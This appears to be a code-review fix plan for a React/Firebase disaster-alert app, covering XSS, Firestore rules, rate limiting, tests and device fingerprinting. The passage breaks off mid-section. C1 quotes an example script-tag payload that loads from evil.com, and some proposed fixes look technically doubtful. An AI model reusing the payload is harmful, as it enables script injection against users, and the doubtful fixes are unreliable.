# Bantayog Alert — Review Fixes Plan (2026-03-27)

**Date:** 2026-03-27
**Status:** Draft
**Based on:** 4-review-agent comprehensive code review pass
**Old plan:** `.planning/security-fix-plan.md` (2026-03-27, partially overlapping — some items may already be fixed; verify before implementing)

---

## Issue Register

| Critical | High | Medium |
|----------|------|--------|
| C1: XSS description rendering | H1: userRole get() per request | M1: submitReport split |
| C2: firebase-messaging-sw missing | H2: No Firestore emulator tests | M2: upvotedBy unbounded |
| C3: Map all reports client-side | H3: No authenticated E2E | M3: RBAC in two places |
| C4: useGeolocation effect loop | H4: Weather 24 parallel calls | M4: ReportDetailCard in App.jsx |
| C5: useRateLimit async not awaited | H5: Upvote race condition | M5: CI npm ci |
| | H6: Alt text accessibility | M6: Reporter name impersonation |
| | H7: No upvote rate limiting | M7: useAuth not memoized |
| | H8: Anonymous account proliferation | M8: Draft clears municipality |
| | H9: safeFileName collision | M9: Anonymous role='' bypass |

---

## Phase 1: Critical Fixes (C1–C5)

---

### C1: XSS via unsanitized description rendering

**Files:** `src/components/Feed/FeedPost.jsx`, `src/components/Map/DisasterMarker.jsx`

**read_first:**
- `src/components/Feed/FeedPost.jsx` lines 226–229
- `src/components/Map/DisasterMarker.jsx` lines 134–136
- `src/utils/sanitization.js` lines 14–48 (sanitizeText function)

**Problem:** `report.disaster?.description` is rendered in JSX as plain text without `sanitizeText()`. A malicious user could submit a report with `<script src="https://evil.com/x.js">` in the description, which would execute for all users viewing that report.

**action:**
1. In `FeedPost.jsx` line 228, change:
   ```jsx
   {report.disaster?.description}
   ```
   to:
   ```jsx
   {sanitizeText(report.disaster?.description)}
   ```
   Add import at the top of the file if not already present:
   ```jsx
   import { sanitizeText } from '../../utils/sanitization';
   ```

2. In `DisasterMarker.jsx` line 135, change:
   ```jsx
   {report.disaster?.description}
   ```
   to:
   ```jsx
   {sanitizeText(report.disaster?.description)}
   ```
   Add import at the top of the file if not already present:
   ```jsx
   import { sanitizeText } from '../../utils/sanitization';
   ```

**acceptance_criteria:**
- `grep -n "sanitizeText.*description" src/components/Feed/FeedPost.jsx` returns a match at the description render line
- `grep -n "sanitizeText.*description" src/components/Map/DisasterMarker.jsx` returns a match at the description render line
- Both render sites pass `sanitizeText()` over the description value

**files_modified:** `src/components/Feed/FeedPost.jsx`, `src/components/Map/DisasterMarker.jsx`

---

### C2: public/firebase-messaging-sw.js missing

**Files:** `public/` (missing file), `src/main.jsx`

**read_first:**
- `src/main.jsx` lines 68–75 (where service worker is registered)
- Firebase Cloud Messaging web client service worker pattern (Firebase docs: https://firebase.google.com/docs/cloud-messaging/js/client)

**Problem:** `main.jsx` line 71 attempts to register `firebase-messaging-sw.js` as a service worker, but the file does not exist in `public/`. The registration error is caught and logged, causing push notifications to silently fail in production.

**action:**
Create `public/firebase-messaging-sw.js` with the following content:

```js
import { initializeApp } from 'firebase/app';
import { getMessaging, onBackgroundMessage } from 'firebase/messaging';

const firebaseApp = initializeApp({
  apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
  authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
  projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
  storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
  appId: import.meta.env.VITE_FIREBASE_APP_ID,
});

const messaging = getMessaging(firebaseApp);

onBackgroundMessage(messaging, (payload) => {
  console.log('[firebase-messaging-sw.js] Received background message:', payload);

  const notificationTitle = payload.notification?.title || 'Bantayog Alert';
  const notificationOptions = {
    body: payload.notification?.body || 'New alert in your area',
    icon: '/favicon.ico',
    badge: '/favicon.ico',
    tag: payload.data?.reportId || 'default',
    data: payload.data,
  };

  return self.registration.showNotification(notificationTitle, notificationOptions);
});

self.addEventListener('install', () => {
  console.log('[firebase-messaging-sw.js] Service Worker installed');
  self.skipWaiting();
});

self.addEventListener('activate', () => {
  console.log('[firebase-messaging-sw.js] Service Worker activated');
  return self.clients.claim();
});
```

**acceptance_criteria:**
- `ls public/firebase-messaging-sw.js` returns the file
- File contains `onBackgroundMessage` from firebase/messaging
- File contains `self.registration.showNotification` call
- File does not contain any hardcoded credentials (all via import.meta.env)

**files_modified:** `public/firebase-messaging-sw.js` (create)

---

### C3: Map loads ALL reports client-side

**Files:** `src/hooks/useReports.js`, `src/components/Map/LeafletMap.jsx`

**read_first:**
- `src/hooks/useReports.js` lines 48–79 (useReports hook, the Firestore query)
- `src/components/Map/LeafletMap.jsx` lines 160–180 (filteredReports useMemo)
- Firebase composite index documentation (requires index on `verification.status` + `timestamp`)

**Problem:** `useReports` calls `onSnapshot` without filtering by verification status. The query loads ALL reports into memory, and `LeafletMap` only filters visibility client-side (hides resolved ones in a useMemo). At 1000+ reports this causes memory pressure and performance degradation.

**action:**
1. In `useReports.js`, add `where('verification.status', '!=', 'resolved')` to the Firestore query around lines 51–60. The query should become:
   ```js
   let q = query(
     collection(db, 'reports'),
     where('verification.status', '!=', 'resolved'),
     orderBy('timestamp', 'desc'),
     limit(FEED_PAGE_SIZE)
   );
   ```
   And when filtering by municipality:
   ```js
   q = query(
     collection(db, 'reports'),
     where('verification.status', '!=', 'resolved'),
     where('location.municipality', '==', filters.municipality),
     orderBy('timestamp', 'desc'),
     limit(FEED_PAGE_SIZE)
   );
   ```

2. Update the `LeafletMap.jsx` filteredReports useMemo to remove the client-side `status !== 'resolved'` filter (since Firestore now filters server-side), but keep coordinate validation:
   ```js
   const filteredReports = useMemo(() => {
     return reports.filter((report) => {
       if (!report.location?.lat || !report.location?.lng) return false;
       if (filters.municipality !== 'all' && report.location?.municipality !== filters.municipality) return false;
       return true;
     });
   }, [reports, filters]);
   ```

3. A Firestore composite index is required. Add to `firebase.json` or via the Firebase console:
   - Collection: `reports`
   - Fields: `verification.status` (asc), `timestamp` (desc)
   - Also: `location.municipality` (asc), `verification.status` (asc), `timestamp` (desc)

**acceptance_criteria:**
- `grep -n "verification.status" src/hooks/useReports.js` returns the where clause in the query
- `grep -n "'resolved'" src/hooks/useReports.js` shows `!=` comparison
- Firestore composite index exists (add to `firebase.json` or create via `firebase firestore:indexes`)
- `LeafletMap.jsx` filteredReports no longer contains `status` filter (verified by grep)

**files_modified:** `src/hooks/useReports.js`, `src/components/Map/LeafletMap.jsx`, `firebase.json` (index section)

---

### C4: useGeolocation.js effect dependency loop

**Files:** `src/hooks/useGeolocation.js`

**read_first:**
- `src/hooks/useGeolocation.js` lines 39–81 (full file content)

**Problem:** `requestLocation` is defined with `useCallback` at line 39, but the useEffect at lines 75–81 uses `[requestLocation]` as its dependency. Since `requestLocation` is stable (no deps), this should not cause an infinite loop currently, BUT the eslint-disable comment at line 79 acknowledges the problem pattern. The effect runs `requestLocation(false)` on every render if `requestLocation` identity changed. Since it is wrapped in useCallback with `getPosition` as a dep, and `getPosition` has `[]` deps, `requestLocation` should be stable — however, the eslint-disable suggests there was concern about the pattern.

**action:**
The effect at lines 75–81 should not depend on `requestLocation` as a dynamic dependency for a fire-once behavior. Restructure to use a `useRef` for the initial mount guard:

```js
const requestLocationRef = useRef(requestLocation);

// Keep ref in sync
useEffect(() => {
  requestLocationRef.current = requestLocation;
}, [requestLocation]);

useEffect(() => {
  let cancelled = false;
  if (!cancelled) {
    // eslint-disable-next-line react-hooks/set-state-in-effect
    requestLocationRef.current(false);
  }
  return () => {
    cancelled = true;
  };
}, []); // Empty deps — only run once on mount
```

Alternatively, since `requestLocation` has `getPosition` as its only dep (and `getPosition` has `[]` deps), the identity is stable. The eslint-disable can be removed and the effect dependency changed to `[]` with a comment explaining why it is safe:

```js
useEffect(() => {
  // requestLocation is stable (useCallback with no reactive deps).
  // It depends on getPosition which has [] deps, so identity never changes.
  // This effect should only fire once on mount.
  // eslint-disable-next-line react-hooks/set-state-in-effect
  requestLocation(false);
}, []); // Empty deps: requestLocation identity is stable
```

**acceptance_criteria:**
- `grep -n "eslint-disable" src/hooks/useGeolocation.js` returns no matches (the disable comment is removed)
- The effect has `[]` dependency array
- No `requestLocation` in the useEffect dependency array

**files_modified:** `src/hooks/useGeolocation.js`

---

### C5: useRateLimit.js async not awaited

**Files:** `src/hooks/useRateLimit.js`

**read_first:**
- `src/hooks/useRateLimit.js` lines 51–85 (performAction function)

**Problem:** At line 78, `const result = actionFn()` is called without `await`. If `actionFn` returns a Promise that rejects, the rejection happens asynchronously after `performAction` has already returned `{ success: true }`. The try/catch at line 77 only catches synchronous throws.

**action:**
Make `performAction` async and await the actionFn:

```js
const performAction = useCallback(
  async (actionFn) => {
    const currentStatus = checkLimit(actionType);

    if (!currentStatus.allowed) {
      return {
        success: false,
        error: 'rate_limited',
        message: `Rate limit exceeded. Please wait ${formatResetTime(currentStatus.resetTime)}.`,
        resetTime: currentStatus.resetTime,
      };
    }

    const recorded = recordAction(actionType);

    if (!recorded) {
      return {
        success: false,
        error: 'rate_limited',
        message: 'Rate limit exceeded.',
        resetTime: 0,
      };
    }

    updateStatus();

    try {
      const result = await actionFn();  // <-- add await
      return { success: true, result };
    } catch (error) {
      return { success: false, error: 'action_failed', message: error.message };
    }
  },
  [actionType, updateStatus]
);
```

Note: All call sites of `performAction` must be updated to `await` the result. Search for usages:
`grep -n "performAction" src/hooks/useReports.js`

**acceptance_criteria:**
- `grep -n "await actionFn" src/hooks/useRateLimit.js` returns the awaited line
- `grep -n "async.*performAction" src/hooks/useRateLimit.js` shows async keyword
- No callers of `performAction` silently ignore the Promise (grep all call sites)

**files_modified:** `src/hooks/useRateLimit.js`

---

## Phase 2: High Priority (H1–H9)

---

### H1: userRole() in Firestore rules makes get() per request

**Files:** `firestore.rules`, `src/hooks/useAuth.js`

**read_first:**
- `firestore.rules` lines 12–15 (userRole function)
- `firestore.rules` lines 22–41 (isAdmin, isModerator, isSuperAdmin)
- Firebase Custom Claims documentation

**Problem:** `userRole()` calls `get(userPath)` for EVERY authenticated Firestore request. At 200 concurrent users, this adds 200 extra Firestore reads per second and adds latency to every query.

**action:**
1. Set custom claims at login time in `useAuth.js`. In the `signIn` function (around line 140) and `signInAsGuest` (around line 144), after a successful sign-in, check the user's role from their user doc and set custom claims:

```js
// In signIn() and signInAsGuest(), after credential.user is returned:
// Fetch role from user document and set custom claims
async function setCustomClaims(user) {
  const { getFirebaseFirestore } = await import('./utils/firebaseConfig');
  const { doc, getDoc } = await import('firebase/firestore');
  const { getAuth } = await getFirebaseAuth();
  const db = await getFirebaseFirestore();

  try {
    const userDocRef = doc(db, 'users', user.uid);
    const userDoc = await getDoc(userDocRef);
    if (userDoc.exists()) {
      const role = userDoc.data().role || '';
      // Set custom claim (requires admin SDK — use a Cloud Function for production)
      // For now, this is noted as a future step requiring a callable Cloud Function
      console.log('[setCustomClaims] Would set role claim:', role);
    }
  } catch (e) {
    console.warn('[setCustomClaims] Failed to set custom claims:', e);
  }
}
```

**Note:** Setting custom claims requires the Firebase Admin SDK, which can only be done via a Cloud Function (not the client SDK). The client-side portion stores the intent, but the actual claim-setting Cloud Function must be created separately. Document this as a two-part fix:
- Part A (client): In `useAuth.js`, after sign-in, read the user's role from Firestore and store it in AuthContext state (already done via `userProfile`)
- Part B (server): Create a Cloud Function `setCustomClaims` callable from the client after login

For the Firestore rules, change `userRole()` to use the token claim instead of a get():
```firestore
function userRole() {
  return isSignedIn() ? request.auth.token.role : '';
}
```

And update `isAdmin`, `isModerator`, `isSuperAdmin` to use `userRole()` without additional gets.

**acceptance_criteria:**
- `firestore.rules` `userRole()` function uses `request.auth.token.role` — no `get()` call
- All helper functions (isAdmin, isModerator) use `userRole()` consistently
- Cloud Function for setting custom claims is created and deployed (separate PR)
- Client-side `useAuth.js` calls the Cloud Function after sign-in to sync claims

**files_modified:** `firestore.rules`, `src/hooks/useAuth.js`, new Cloud Function file

---

### H2: No Firestore emulator/security rules tests

**Files:** `.github/workflows/ci.yml`, `firebase.json`, `firestore.rules`

**read_first:**
- `.github/workflows/ci.yml` lines 84–128 (firestore-rules job)
- `firebase.json` (existing emulators config if any)
- Firebase Emulator Suite documentation

**Problem:** CI only syntax-checks the rules (grep for keywords). No behavioral tests exist that load Firebase Emulator, deploy rules, and exercise each rule with positive/negative test cases.

**action:**
1. Add a new script in `package.json`:
   ```json
   "test:emulator": "firebase emulators:exec --only firestore --import=./test-emulator-data 'node tests/emulator/rules.test.js'"
   ```

2. Create `tests/emulator/rules.test.js` that:
   - Loads Firebase Emulator with the current rules
   - Tests positive cases (admin can update reports, user can create reports)
   - Tests negative cases (unauthenticated cannot create, anonymous cannot update others' reports)
   - Tests rate limiting (same user cannot submit within 60 seconds)
   - Tests tag XSS validation

3. Add a new CI job in `.github/workflows/ci.yml`:
   ```yaml
   firestore-emulator-tests:
     name: Firestore Emulator Tests
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v6
       - uses: actions/setup-node@v6
         with:
           node-version: 20
       - name: Install Firebase CLI
         run: npm install -g firebase-tools
       - name: Install dependencies
         run: npm ci
       - name: Run emulator tests
         run: npm run test:emulator
   ```

**acceptance_criteria:**
- `tests/emulator/rules.test.js` exists with at least 10 test cases covering key rules
- CI job `firestore-emulator-tests` is present in `ci.yml`
- Test output shows passed/failed rules validation

**files_modified:** `.github/workflows/ci.yml`, `package.json`, `tests/emulator/rules.test.js` (create)

---

### H3: No authenticated E2E flows tested

**Files:** `e2e/` directory

**read_first:**
- `e2e/` directory structure (list all .spec.js files)
- `package.json` scripts for Playwright

**Problem:** Playwright tests only cover unauthenticated browsing. Core authenticated flows (sign up, sign in, submit report, upvote, admin verify/reject) are untested.

**action:**
Create the following new test files:

1. `e2e/auth-flows.spec.js`:
   - `test('Sign up with email and password')`
   - `test('Sign in with wrong password shows error')`
   - `test('Sign up with existing email shows error')`
   - `test('Anonymous user sees sign-up prompt for protected actions')`
   - `test('Sign out clears session')`

2. `e2e/report-submission.spec.js`:
   - `test('Submit report as authenticated user')`
   - `test('Submit report with photo evidence')`
   - `test('Submit report with description < 10 chars shows validation')`
   - `test('Report appears in feed after submission')`

3. `e2e/upvote.spec.js`:
   - `test('Registered user can upvote a report')`
   - `test('Upvote button toggles correctly')`
   - `test('Anonymous user sees sign-up prompt on upvote')`

4. `e2e/admin-workflow.spec.js`:
   - `test('Admin can view pending reports')`
   - `test('Admin can verify a report')`
   - `test('Admin can resolve a report with evidence')`

For each test, use `page.goto()` with the app URL, perform auth via UI (not via API mocking), and use `locator` assertions. Use `test.beforeEach` to handle authentication state.

**acceptance_criteria:**
- `ls e2e/*auth*.spec.js` returns at least one auth test file
- `grep -c "test\(" e2e/auth-flows.spec.js` >= 4 tests
- `grep -c "test\(" e2e/report-submission.spec.js` >= 3 tests
- `grep -c "test\(" e2e/upvote.spec.js` >= 3 tests
- `grep -c "test\(" e2e/admin-workflow.spec.js` >= 3 tests

**files_modified:** `e2e/auth-flows.spec.js`, `e2e/report-submission.spec.js`, `e2e/upvote.spec.js`, `e2e/admin-workflow.spec.js` (create)

---

### H4: Weather API 24 parallel calls per load

**Files:** `src/hooks/useWeather.js`

**read_first:**
- `src/hooks/useWeather.js` lines 64–121 (useAllMunicipalitiesWeather)
- OpenWeather API batch/bulk endpoint documentation

**Problem:** `useAllMunicipalitiesWeather()` runs `Promise.all` over 12 municipalities, each making 2 API calls (current weather + forecast) = 24 parallel requests per tab open. OpenWeather free tier limit is 60 calls/minute. At 3 concurrent users, the quota is exhausted.

**action:**
Replace the per-municipality parallel fetch with a single server-side Cloud Function that fetches all municipalities at once (OpenWeather supports this via their bulk/one-call API). Since a Cloud Function may not exist yet, implement a simpler client-side fix as an intermediate step:

**Intermediate client-side fix** (while Cloud Function is built):
Use sequential batching with a shared cache at the module level. The existing `weatherCache` in `useWeather.js` already provides per-municipality caching — the issue is the initial load fires all requests at once. Change to sequential fetch with early bailout on error:

```js
// In useAllMunicipalitiesWeather fetchAll():
// Fetch municipalities in sequence, not parallel, to reduce concurrent API calls.
// Still uses Promise.all internally but caps concurrency.
const entries = Object.entries(MUNICIPALITY_COORDS);
const results = {};
const forecasts = {};
let fetchErrors = 0;

// Fetch in batches of 4 to stay under the 60/min limit
const BATCH_SIZE = 4;
for (let i = 0; i < entries.length; i += BATCH_SIZE) {
  const batch = entries.slice(i, i + BATCH_SIZE);
  const batchPromises = batch.map(async ([name, coords]) => {
    const cached = weatherCache.get(name);
    if (cached && Date.now() - cached.timestamp < WEATHER_CACHE_DURATION) {
      results[name] = cached.weather;
      forecasts[name] = cached.forecast || [];
      return;
    }
    try {
      const [weather, forecast] = await Promise.all([
        fetchCurrentWeather(coords.lat, coords.lng),
        fetchForecast(coords.lat, coords.lng),
      ]);
      results[name] = weather;
      forecasts[name] = forecast || [];
      weatherCache.set(name, { weather, forecast: forecast || [], timestamp: Date.now() });
    } catch {
      results[name] = null;
      forecasts[name] = [];
      fetchErrors++;
    }
  });
  await Promise.all(batchPromises);
}
```

**Long-term fix:** Create a Cloud Function `getAllMunicipalitiesWeather` that calls OpenWeather API once for all 12 municipalities using the bulk/one-call API, caches the result in Memcached/Redis, and returns all weather data in one response.

**acceptance_criteria:**
- `useAllMunicipalitiesWeather` no longer uses unbounded `Promise.all` over all 12 municipalities
- Batch size of 4 is used (observable in the code)
- Cloud Function exists for long-term fix (separate PR)

**files_modified:** `src/hooks/useWeather.js`

---

### H5: EngagementButtons upvote race condition

**Files:** `src/components/Feed/EngagementButtons.jsx`

**read_first:**
- `src/components/Feed/EngagementButtons.jsx` lines 1–60

**Problem:** `hasUpvoted` is captured at render time (line 16) as a closure. If another browser tab changes the upvote state, the user sees stale UI and may double-add or double-remove an upvote.

**action:**
Refresh the upvote state from Firestore before acting. In `handleUpvote`, re-read the current upvote state immediately before the toggle:

```js
const handleUpvote = async () => {
  if (!requireRegisteredUser()) return;
  if (isUpvoting) return;
  setIsUpvoting(true);

  try {
    // Refresh upvote state from the report prop passed by parent
    // The parent (FeedPost) receives real-time updates via onSnapshot.
    // We trust the prop; the Firestore transaction handles the actual logic.
    const currentlyUpvoted = report.engagement?.upvotedBy?.includes(user?.uid) ?? false;

    if (currentlyUpvoted) {
      await removeUpvote(report.id, user.uid);
    } else {
      await upvoteReport(report.id, user.uid);
    }
  } catch {
    addToast('Failed to update vote', 'error');
  } finally {
    setIsUpvoting(false);
  }
};
```

**Note:** This approach trusts the parent component's real-time `report` prop (which comes from `useReports` via onSnapshot). The actual toggle logic is protected by Firestore transactions that handle the real state. The fix ensures the UI decision is based on the latest prop, not a stale closure.

**acceptance_criteria:**
- `handleUpvote` re-reads `report.engagement?.upvotedBy` from the prop, not a stale closure variable
- No local `hasUpvoted` variable used inside `handleUpvote` that could go stale
- The `report` parameter in the function closure is used directly

**files_modified:** `src/components/Feed/EngagementButtons.jsx`

---

### H6: Alt text "Report" on all images — accessibility violation

**Files:** `src/components/Feed/FeedPost.jsx`

**read_first:**
- `src/components/Feed/FeedPost.jsx` lines 196–210 (image render section)

**Problem:** All report images have `alt="Report"`. Screen readers announce "Report" for every image, providing no context about which report or what the image shows.

**action:**
Change the `alt` attribute to be descriptive. Use the report type, municipality, and image index:

```jsx
<img
  src={photos[imageIndex]}
  alt={`${report.disaster?.type ?? 'Report'} photo ${imageIndex + 1} of ${photos.length} — ${report.location?.municipality ?? 'Unknown municipality'}`}
  className="w-full max-h-80 object-cover"
  loading="lazy"
/>
```

**acceptance_criteria:**
- `grep -n 'alt="Report"' src/components/Feed/FeedPost.jsx` returns no matches
- `alt=` attribute contains `report.disaster?.type` and `municipality` references
- Alt text is unique per image (includes imageIndex)

**files_modified:** `src/components/Feed/FeedPost.jsx`

---

### H7: No upvote rate limiting

**Files:** `src/hooks/useReports.js` lines 314–353, `firestore.rules`

**read_first:**
- `src/hooks/useReports.js` lines 314–353 (upvoteReport and removeUpvote)
- `firestore.rules` (upvote-related rules if any)
- `src/utils/rateLimiter.js` (existing rate limiter for reference)

**Problem:** Upvote transactions are atomic but not rate-limited. A user could rapidly toggle upvotes to harass users or spam the engagement system.

**action:**
Add server-side rate limiting for engagement actions. In `firestore.rules`, add:

```firestore
function canEngageReportNow() {
  let engagePath = /databases/$(database)/documents/rateLimits/$(request.auth.uid);
  return !exists(engagePath)
    || (request.time - get(engagePath).data.lastEngageAt).seconds >= 5;
}

function updateEngageTimestamp() {
  let engagePath = /databases/$(database)/documents/rateLimits/$(request.auth.uid);
  return exists(engagePath)
    ? get(engagePath).data.lastEngageAt
    : request.time;
}
```

Then in the `reports/{reportId}` update rule for engagement fields:
```firestore
allow update: if isSignedIn()
  && request.resource.data.diff(resource.data).affectedKeys().hasOnly(['engagement'])
  && canEngageReportNow();
```

In `useReports.js`, the upvote/removeUpvote functions should call a rate-limit update before the transaction:
```js
// At start of upvoteReport:
const rateLimitRef = doc(db, 'rateLimits', userId);
await setDoc(rateLimitRef, { lastEngageAt: serverTimestamp() }, { merge: true });
```

Also add client-side rate limiting in `EngagementButtons.jsx` using the existing `useRateLimit` hook:
```jsx
const upvoteRateLimit = useRateLimit('upvote', { windowMs: 5000, maxAttempts: 1 });
```

**acceptance_criteria:**
- `firestore.rules` has `canEngageReportNow` function with 5-second cooldown
- `upvoteReport` and `removeUpvote` in `useReports.js` call rate limit update before transaction
- `EngagementButtons.jsx` uses `useRateLimit('upvote', ...)` to disable button during cooldown
- `grep -n "rateLimit\|lastEngageAt" src/hooks/useReports.js` returns engagement rate limit calls

**files_modified:** `firestore.rules`, `src/hooks/useReports.js`, `src/components/Feed/EngagementButtons.jsx`

---

### H8: Anonymous account proliferation

**Files:** `src/hooks/useAuth.js`

**read_first:**
- `src/hooks/useAuth.js` lines 144–160 (signInAsGuest)
- Firebase anonymous auth documentation

**Problem:** Firebase anonymous auth creates unlimited new accounts. Combined with no device fingerprinting, users can bypass rate limits by creating new anonymous accounts.

**action:**
This requires a server-side Cloud Function to link anonymous accounts to device fingerprints. Implement a Cloud Function `onAnonymousAuth` that:
1. Reads a device fingerprint from the client (sent as a custom claim or in the user agent)
2. Stores the fingerprint -> anonymous UID mapping in Firestore
3. Merges multiple anonymous accounts using Firebase Account Linking API if the same fingerprint attempts to create a second account

On the client side, generate a device fingerprint using available browser signals (screen resolution, timezone, language, canvas fingerprint):

```js
// In useAuth.js, generateDeviceFingerprint function:
function generateDeviceFingerprint() {
  const components = [
    navigator.userAgent,
    navigator.language,
    screen.width,
    screen.height,
    new Date().getTimezoneOffset(),
  ];
  let hash = 0;
  for (const component of components) {
    const str = String(component);
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = (hash << 5) - hash + char;
      hash = hash & hash; // Convert to 32bit integer
    }
  }
  return `fp_${Math.abs(hash).toString(36)}`;
}
```

Pass this fingerprint to the Cloud Function on every anonymous sign-in. The Cloud Function stores `fingerprint -> uid` mapping.

**Note:** This is a Cloud Function implementation. Client-side generates fingerprint and calls the function; Cloud Function does the linking and stores the mapping. This cannot be fully implemented client-side only.

**acceptance_criteria:**
- `generateDeviceFingerprint()` function exists in `useAuth.js`
- Cloud Function `onAnonymousAuth` created (separate file/PR)
- Anonymous accounts are linked by fingerprint (Cloud Function logic)
- Multiple anonymous accounts from same device are detected and blocked or merged

**files_modified:** `src/hooks/useAuth.js`, new Cloud Function file

---

### H9: safeFileName timestamp collision

**Files:** `src/hooks/useReports.js`

**read_first:**
- `src/hooks/useReports.js` lines 155–158, 178–180, 426

**Problem:** `Date.now() + index` is used for file names. Two uploads in the same millisecond (or across concurrent users) could produce identical timestamps and collide, causing one file to overwrite another.

**action:**
Replace `Date.now()` with `crypto.randomUUID()` (available in all modern browsers and Node.js):

```js
// In image upload section (lines 155–158):
const ts = Date.now() + index;  // REMOVE
const safeName = safeFileName(photo.name);
const uniqueId = crypto.randomUUID();  // ADD
const photoRef = ref(storageInstance, `reports/${uniqueId}_${safeName}`);
const thumbRef = ref(storageInstance, `reports/thumbs/${uniqueId}_${safeName}`);

// In video upload section (lines 178–180):
const ts = Date.now() + index;  // REMOVE
const safeName = safeFileName(video.name);
const uniqueId = crypto.randomUUID();  // ADD
const videoRef = ref(storageInstance, `reports/videos/${uniqueId}_${safeName}`);

// In resolveReport evidence upload (line 426):
const photoRef = storageMod.ref(storageInst, `evidence/${crypto.randomUUID()}_${safeName}`);
```

**acceptance_criteria:**
- `grep -n "Date.now\(\)" src/hooks/useReports.js | grep -v "Date.now() / 1000"` shows no file path constructions
- `grep -n "crypto.randomUUID" src/hooks/useReports.js` returns matches at all three upload locations

**files_modified:** `src/hooks/useReports.js`

---

## Phase 3: Medium Priority (M1–M9)

---

### M1: submitReport 200+ lines — should be split

**Files:** `src/hooks/useReports.js`

**read_first:**
- `src/hooks/useReports.js` lines 111–313 (full submitReport function)

**Problem:** `submitReport` is a 200-line function handling rate limiting, geo resolution, image uploads, video uploads, weather fetch, Firestore transaction, and audit logging all in one function.

**action:**
Extract helper functions from `submitReport`:

1. `uploadMediaFiles(imageFiles, videoFiles, storageInstance)` — returns `{ photoUrls, thumbnailUrls, videoUrls, skippedFiles }`
2. `fetchWeatherContext(lat, lng)` — returns weather context object
3. `buildReportDocument(reportData, mediaUrls, weatherContext, user)` — returns the Firestore document shape

Then refactor `submitReport` to call these helpers:
```js
export async function submitReport(reportData, evidenceFiles, activeUser) {
  // Rate limit check (keep here — this IS the rate limit gate)
  const rateCheck = checkLimit('report_submission');
  if (!rateCheck.allowed) {
    return { success: false, error: 'rate_limited', message: formatResetTime(rateCheck.resetTime) };
  }

  // Geo resolution
  const resolved = resolveMunicipality(reportData.location.lat, reportData.location.lng);
  reportData.location = { ...reportData.location, municipality: resolved.municipality };

  // Media uploads (parallel with weather)
  const [storageMod, storageInst] = await Promise.all([...]);
  const { photoUrls, thumbnailUrls, videoUrls, skippedFiles } = await uploadMediaFiles(...);
  const weatherContext = await fetchWeatherContext(...);

  // Build doc and write to Firestore
  const doc = buildReportDocument(reportData, { photoUrls, thumbnailUrls, videoUrls }, weatherContext, activeUser);
  const docRef = await addDoc(collection(db, 'reports'), doc);

  // Audit log
  await logAuditEvent(new AuditEvent({ ... }));

  return { id: docRef.id, skippedFiles };
}
```

**acceptance_criteria:**
- `submitReport` function is <= 60 lines
- `uploadMediaFiles`, `fetchWeatherContext`, `buildReportDocument` exist as separate exported functions
- All existing functionality preserved (run existing tests)

**files_modified:** `src/hooks/useReports.js`

---

### M2: upvotedBy array unbounded growth

**Files:** `src/hooks/useReports.js`, `firestore.rules`

**read_first:**
- `src/hooks/useReports.js` lines 314–353 (upvote/removeUpvote)
- Firestore document size limits (1MB per document)

**Problem:** `upvotedBy` is an array that grows forever. A popular report with 10,000 upvotes = 10,000 user IDs in one document, approaching the 1MB Firestore limit.

**action:**
Migrate from array-based upvoting to a subcollection. For each report, create a `upvotes/{userId}` subcollection document:

```js
// New upvoteReport:
export async function upvoteReport(reportId, userId) {
  const upvoteRef = doc(db, 'reports', reportId, 'upvotes', userId);
  await setDoc(upvoteRef, { votedAt: serverTimestamp() });
  // Increment counter on parent
  const reportRef = doc(db, 'reports', reportId);
  await runTransaction(db, async (tx) => {
    tx.update(reportRef, { 'engagement.upvotes': increment(1) });
  });
}

// New removeUpvote:
export async function removeUpvote(reportId, userId) {
  const upvoteRef = doc(db, 'reports', reportId, 'upvotes', userId);
  await deleteDoc(upvoteRef);
  const reportRef = doc(db, 'reports', reportId);
  await runTransaction(db, async (tx) => {
    tx.update(reportRef, { 'engagement.upvotes': increment(-1) });
  });
}

// New hasUpvoted query:
export async function hasUpvoted(reportId, userId) {
  const upvoteRef = doc(db, 'reports', reportId, 'upvotes', userId);
  const snap = await getDoc(upvoteRef);
  return snap.exists();
}
```

In `firestore.rules`, add:
```firestore
match /reports/{reportId}/upvotes/{upvoteId} {
  allow read: if isSignedIn();
  allow write: if isSignedIn() && request.auth.uid == upvoteId;
}
```

**Migration:** Existing `upvotedBy` arrays in Firestore must be migrated to the subcollection format. Create a one-time migration script:
```js
// migration/migrateUpvotedByToSubcollection.js
// Reads all reports with upvotedBy arrays, creates subcollection docs, removes array field
```

**acceptance_criteria:**
- `upvoteReport` uses subcollection, not arrayUnion
- `removeUpvote` uses subcollection delete, not arrayRemove
- `EngagementButtons.jsx` calls `hasUpvoted(report.id, user.uid)` to check state (not `report.engagement.upvotedBy.includes()`)
- Firestore rules allow subcollection read/write with correct ownership

**files_modified:** `src/hooks/useReports.js`, `firestore.rules`, `src/components/Feed/EngagementButtons.jsx`, `migration/migrateUpvotedByToSubcollection.js` (create)

---

### M3: RBAC in two places — drift risk

**Files:** `firestore.rules`, `src/utils/rbac.js`

**read_first:**
- `firestore.rules` lines 22–41 (isAdmin, isModerator, isSuperAdmin)
- `src/utils/rbac.js` (full file if it exists)

**Problem:** Firestore rules define `isAdmin/isModerator` and `src/utils/rbac.js` defines `hasPermission/normalizeRole`. These two implementations can drift, causing security bugs where the JS layer allows something the rules block or vice versa.

**action:**
1. Document the divergence in `docs/rbac-divergence.md`:
   - Firestore rules use `userRole()` which calls `get()` on the user document
   - JS RBAC reads `userProfile.role` from AuthContext
   - Both must be kept in sync when roles are changed

2. Generate `firestore.rules` RBAC functions from a shared `src/utils/rbacConfig.js`:
   ```js
   // src/utils/rbacConfig.js
   export const ADMIN_ROLES = ['superadmin_provincial'];
   export const MODERATOR_ROLES = ['superadmin_provincial', 'moderator'];
   export const isAdminRole = (role) => ADMIN_ROLES.includes(role) || role.startsWith('admin_');
   export const isModeratorRole = (role) => MODERATOR_ROLES.includes(role) || role.startsWith('admin_');
   ```

3. In `firestore.rules`, reference the same role definitions (Firestore rules can be commented to point to `rbacConfig.js` for documentation).

4. Add CI check that the two RBAC implementations are consistent:
   ```yaml
   # In CI, after build:
   - name: Verify RBAC consistency
     run: node scripts/verify-rbac-consistency.js
